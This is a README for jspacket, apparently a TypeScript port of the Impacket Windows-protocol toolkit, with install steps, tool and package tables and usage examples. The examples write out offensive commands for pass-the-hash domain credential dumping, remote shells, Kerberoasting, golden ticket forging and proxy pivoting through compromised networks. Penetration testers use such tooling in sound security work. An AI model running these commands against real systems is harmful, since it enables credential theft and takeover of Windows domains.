<p align="center">
  <img src="jspacket.png" alt="jspacket" width="480">
</p>

<p align="center">
  <strong>TypeScript port of <a href="https://github.com/fortra/impacket">Impacket</a></strong><br>
  52 tools &middot; 44 packages &middot; 152k lines &middot; Node.js 18+
</p>

<p align="center">
  A lightweight, fast, and fully portable reimplementation of Impacket in TypeScript and JavaScript. No Python runtime, no native extensions — just <code>npm install</code> and go, or compile to a standalone binary. Ships as self-contained JavaScript bundles that run anywhere Node.js runs: Linux, macOS, Windows, WSL, Docker, and CI pipelines. Same tools, same flags, same output — if you know Impacket, you already know jspacket.
</p>

<p align="center">
  <a href="#install">Install</a> &middot;
  <a href="#tools">Tools</a> &middot;
  <a href="#usage--examples">Usage</a> &middot;
  <a href="#proxy-support">Proxy</a> &middot;
  <a href="#platform-support">Platforms</a> &middot;
  <a href="#contributing">Contributing</a>
</p>

---

> **Beta Release — Highly Experimental.**
> jspacket is under active development. Core tools have been tested against Active Directory lab environments, but edge cases and protocol quirks are expected. If something isn't working, please test the same operation with Impacket side-by-side and include both outputs in your bug report. This helps us quickly identify whether it's a jspacket-specific issue or a shared protocol limitation.

---

## What is jspacket?

jspacket is a ground-up TypeScript reimplementation of [Impacket](https://github.com/fortra/impacket) — the gold-standard Python library for working with Windows network protocols. Built as a pnpm monorepo with 44 packages mirroring Impacket's module structure, plus protocol insights from [GoPacket](https://github.com/duty1g/gopacket) (Go port).

## Install

```bash
npm install -g jspacket
```

Or run without installing:

```bash
npx jspacket-secretsdump domain/user@target
```

## Usage & Examples

### Authentication

jspacket supports the same authentication methods as Impacket:

```bash
# Password
jspacket-secretsdump 'DOMAIN/admin:Password123@dc01.domain.local'

# NTLM hash (pass-the-hash)
jspacket-secretsdump 'DOMAIN/admin@dc01' -hashes :aabbccddee1122334455667788990011

# Kerberos (ccache ticket)
export KRB5CCNAME=admin.ccache
jspacket-secretsdump 'DOMAIN/admin@dc01' -k -no-pass

# AES key
jspacket-getTGT 'DOMAIN/admin@dc01' -aesKey <aes256-key>
```

### Credential dumping

```bash
# Full domain dump (SAM + LSA + NTDS via DRSUAPI)
jspacket-secretsdump 'DOMAIN/admin@dc01' -hashes :nthash

# Just NTDS (all domain hashes)
jspacket-secretsdump 'DOMAIN/admin@dc01' -hashes :nthash -just-dc

# Single user
jspacket-secretsdump 'DOMAIN/admin@dc01' -hashes :nthash -just-dc-user krbtgt
```

### Remote execution

```bash
# PSExec shell
jspacket-psexec 'DOMAIN/admin:password@target'

# WMI-based shell (stealthier)
jspacket-wmiexec 'DOMAIN/admin:password@target'

# DCOM-based shell
jspacket-dcomexec 'DOMAIN/admin:password@target'

# Task-based (AT scheduler)
jspacket-atexec 'DOMAIN/admin:password@target' 'whoami'
```

### Kerberos attacks

```bash
# Kerberoasting
jspacket-GetUserSPNs 'DOMAIN/user:password@dc01' -request

# AS-REP roasting
jspacket-GetNPUsers 'DOMAIN/user:password@dc01' -request

# Request a TGT
jspacket-getTGT 'DOMAIN/user:password'

# Golden ticket
jspacket-ticketer -nthash <krbtgt-hash> -domain-sid S-1-5-21-... -domain DOMAIN admin
```

### AD enumeration

```bash
# Enumerate users
jspacket-GetADUsers 'DOMAIN/user:password@dc01' -all

# Enumerate computers
jspacket-GetADComputers 'DOMAIN/user:password@dc01' -all

# SID lookup
jspacket-lookupsid 'DOMAIN/user:password@dc01'

# Find delegation
jspacket-findDelegation 'DOMAIN/user:password@dc01'
```

### SMB operations

```bash
# Interactive SMB client
jspacket-smbclient 'DOMAIN/user:password@target'

# Remote service control
jspacket-services 'DOMAIN/admin:password@target' list

# Remote registry
jspacket-reg 'DOMAIN/admin:password@target' query -keyName HKLM\\SYSTEM\\CurrentControlSet
```

## Proxy Support

All 52 tools support SOCKS5 proxying for pivoting through compromised networks:

```bash
# Native -proxy flag (recommended)
jspacket-secretsdump 'DOMAIN/admin@dc' -hashes :nthash -proxy socks5://127.0.0.1:1080

# With proxy authentication
jspacket-wmiexec 'DOMAIN/admin@dc' -proxy socks5://user:pass@proxy:1080

# Via environment variable
export JSPACKET_PROXY=socks5://127.0.0.1:1080
jspacket-secretsdump 'DOMAIN/admin@dc' -hashes :nthash

# Via proxychains (LD_PRELOAD — works out of the box)
proxychains4 jspacket-secretsdump 'DOMAIN/admin@dc' -hashes :nthash
```

All connection types are routed through the proxy: SMB, DCE/RPC, LDAP, Kerberos.

## Platform Support

| Platform | Status | Notes |
|----------|--------|-------|
| Linux (x64/arm64) | Fully supported | Primary development platform |
| WSL / WSL2 | Fully supported | Tested extensively |
| macOS (Intel/Apple Silicon) | Fully supported | No native deps to compile |
| Windows (native) | Fully supported | Via `node`/`npx`, PowerShell or CMD |
| Docker | Fully supported | `node:18-alpine` or any Node image |
| CI/CD (GitHub Actions, etc.) | Fully supported | Single `npm install -g jspacket` step |

**Requirements:** Node.js 18+ (LTS recommended). No Python, no build tools, no native modules.

## Tools

All 52 Impacket example scripts, ported and tested against live Active Directory.

### Remote execution
| Tool | Description |
|------|-------------|
| `jspacket-psexec` | PSExec-style remote shell via SMB/SCMR |
| `jspacket-wmiexec` | Semi-interactive shell via WMI |
| `jspacket-smbexec` | Stealthy shell via SMB service creation |
| `jspacket-dcomexec` | Shell via DCOM (MMC20/ShellWindows/ShellBrowserWindow) |
| `jspacket-atexec` | Task-based execution via ATSVC |

### Credential extraction
| Tool | Description |
|------|-------------|
| `jspacket-secretsdump` | Domain/local credential dump (DRSUAPI, SAM, LSA, cached) |
| `jspacket-dpapi` | DPAPI backup key retrieval, masterkey/credential/vault decrypt |
| `jspacket-samedit` | In-place SAM hive password editing |

### Kerberos
| Tool | Description |
|------|-------------|
| `jspacket-getTGT` | Request a TGT with password, hash, or aesKey |
| `jspacket-getST` | Request a service ticket (S4U2self/S4U2proxy/U2U) |
| `jspacket-GetUserSPNs` | Kerberoasting — request TGS for SPNs |
| `jspacket-GetNPUsers` | AS-REP roasting — find users without pre-auth |
| `jspacket-ticketer` | Golden/silver ticket creation |
| `jspacket-describeTicket` | Parse and display ccache/kirbi tickets |
| `jspacket-ticketConverter` | Convert between ccache and kirbi formats |
| `jspacket-getPac` | Retrieve a user's PAC via S4U2self |
| `jspacket-keylistattack` | RODC key-list attack |
| `jspacket-raiseChild` | Child-to-parent domain escalation |

### AD enumeration & attacks
| Tool | Description |
|------|-------------|
| `jspacket-GetADUsers` | Enumerate domain users via LDAP |
| `jspacket-GetADComputers` | Enumerate domain computers via LDAP |
| `jspacket-findDelegation` | Find delegation relationships |
| `jspacket-lookupsid` | SID brute-force enumeration |
| `jspacket-samrdump` | User enumeration via SAMR |
| `jspacket-addcomputer` | Add a machine account (SAMR/LDAPS) |
| `jspacket-changepasswd` | Change/reset password (SAMR/Kpasswd/LDAP) |
| `jspacket-rbcd` | RBCD (msDS-AllowedToActOnBehalfOfOtherIdentity) |
| `jspacket-dacledit` | DACL/ACE editing on AD objects |
| `jspacket-owneredit` | Read/write object owner SID |
| `jspacket-badsuccessor` | dMSA BadSuccessor abuse |

### DCE/RPC & host operations
| Tool | Description |
|------|-------------|
| `jspacket-rpcdump` | RPC endpoint mapper dump |
| `jspacket-rpcmap` | RPC interface/UUID bruteforce scanning |
| `jspacket-services` | Remote service control via SCMR |
| `jspacket-reg` | Remote registry read/write/save via RRP |
| `jspacket-wmiquery` | WQL queries over WMI |
| `jspacket-wmipersist` | WMI event subscription persistence |
| `jspacket-machine-role` | Detect DC/workstation role |
| `jspacket-getArch` | Remote architecture detection via RPC |
| `jspacket-tstool` | Terminal Services session operations |
| `jspacket-net` | net-command enumeration via SAMR |

### SMB & file operations
| Tool | Description |
|------|-------------|
| `jspacket-smbclient` | Interactive SMB client |
| `jspacket-smbserver` | Standalone SMB server |
| `jspacket-karmaSMB` | Rogue SMB server (per-extension payload delivery) |
| `jspacket-attrib` | Remote file attribute query/set |
| `jspacket-ntlmrelayx` | NTLM relay engine (SMB+HTTP) |

### SQL & other protocols
| Tool | Description |
|------|-------------|
| `jspacket-mssqlclient` | Interactive SQL Server client |
| `jspacket-mssqlinstance` | SQL Server instance enumeration via Browser |
| `jspacket-exchanger` | Exchange NSPI attacks over RPC/HTTP v2 |
| `jspacket-mqtt-check` | MQTT login check |

### Offline tools
| Tool | Description |
|------|-------------|
| `jspacket-registry-read` | Offline registry hive parsing |
| `jspacket-esentutl` | ESE/JET database tool |
| `jspacket-ntfs-read` | Raw NTFS volume reading |
| `jspacket-filetime` | Windows FILETIME converter |

## Packages

44 packages under `packages/`, each mapping to an Impacket Python module:

| Package | Maps to |
|---------|---------|
| `@impacket/structure` | `structure.py` — binary serialization DSL |
| `@impacket/ntlm` | `ntlm.py` — NTLMSSP authentication |
| `@impacket/krb5` | `krb5/*` — Kerberos 5 |
| `@impacket/smb3` | `smb3.py` — SMB 2/3 client |
| `@impacket/smb` | `smb.py` — SMB 1 client |
| `@impacket/smb-connection` | `smbconnection.py` — unified SMB interface |
| `@impacket/dcerpc` | `dcerpc/v5/*` — DCE/RPC + 20+ service interfaces |
| `@impacket/ldap` | `ldap/*` — LDAP client + types |
| `@impacket/crypto` | `crypto.py` — RC4, AES-CTS, DES, KDF, NTLM hash |
| `@impacket/dpapi` | `dpapi.py` — DPAPI structures and decryption |
| `@impacket/ese` | `ese.py` — ESE/JET database engine |
| `@impacket/winregistry` | `winregistry.py` — offline registry hive parser |
| `@impacket/tds` | `tds.py` — TDS protocol (SQL Server) |
| `@impacket/nmb` | `nmb.py` — NetBIOS session transport |
| `@impacket/spnego` | `spnego.py` — SPNEGO/GSS-API |
| `@impacket/asn1` | ASN.1 DER/BER codec |
| `@impacket/smb-server` | SMB server implementation |
| `@impacket/socks` | SOCKS5 proxy client |
| `@impacket/examples` | Shared CLI helpers, logging, parsers |
| ... | *+ 25 more (uuid, acl, http, mqtt, dns, etc.)* |

## Development

```bash
# Clone and install
git clone https://github.com/duty1g/jspacket
cd jspacket
pnpm install

# Build all packages
pnpm build

# Run a tool in dev mode (no build needed)
npx tsx tools/src/secretsdump.ts domain/user@target

# Run tests
pnpm test

# Type check
pnpm typecheck

# Build publishable CLI package
cd tools && node build.mjs
```

### Project structure

```
jspacket/
  packages/          # 44 library packages (@impacket/*)
    structure/       # Binary serialization DSL
    ntlm/            # NTLMSSP authentication
    krb5/            # Kerberos 5
    smb3/            # SMB 2/3 client
    dcerpc/          # DCE/RPC + service interfaces
    ldap/            # LDAP client
    crypto/          # Crypto primitives
    socks/           # SOCKS5 proxy support
    ...
  tools/
    src/             # 52 CLI tools (TypeScript source)
    dist/            # Built tools (standalone .mjs bundles)
    build.mjs        # esbuild bundler
    package.json     # npm package config (publishable as "jspacket")
```

## Contributing

Contributions are welcome. jspacket is a large codebase — here's how to get started:

1. **Pick a tool** — check the [issues](https://github.com/duty1g/jspacket/issues) for bugs or missing features
2. **Test against Impacket** — run the same command with both tools and compare output
3. **Submit a PR** — keep changes focused; one tool/package per PR when possible

### Guidelines

- Match Impacket's output format and flag names so users can switch seamlessly
- Use the existing `@impacket/*` packages rather than adding new dependencies
- Every tool should be testable with `npx tsx tools/src/<tool>.ts` in dev mode
- Include the Impacket command you tested against in your PR description

## Reporting Issues

Found a bug? Please [open an issue](https://github.com/duty1g/jspacket/issues/new) with:

1. **The jspacket command** you ran (redact credentials)
2. **The equivalent Impacket command** and its output
3. **The jspacket output** (full error/traceback)
4. **Your environment** — OS, Node.js version (`node -v`), jspacket version

Side-by-side comparison with Impacket is the fastest way to triage — it tells us immediately whether the issue is in our protocol implementation or something upstream.

## Credits

- [Impacket](https://github.com/fortra/impacket) by Fortra (Alberto Solino / @agsolino) — the original Python implementation that jspacket ports from
- [GoPacket](https://github.com/duty1g/gopacket) — Go port of Impacket, used as a secondary reference for protocol edge cases

## License

Modified Apache License, inherited from Impacket. See [LICENSE](./LICENSE).
